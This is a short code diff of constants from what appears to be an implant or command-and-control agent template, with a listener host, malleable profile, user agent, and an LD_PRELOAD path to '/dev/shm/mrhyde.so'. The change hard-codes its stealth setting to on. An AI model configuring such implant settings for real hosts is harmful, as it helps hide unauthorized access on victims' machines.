@@ -55,7 +55,7 @@ const (
     MALEABLE   = "{maleable}"
     USER_AGENT = "{useragent}"
     MAX_RETRIES = 3
-    STEALTH    = "{stealth}"
+    STEALTH    = "True"
     LHOST      = "{lhost}"
     DESIRED_LD_PRELOAD = "/dev/shm/mrhyde.so"
 )
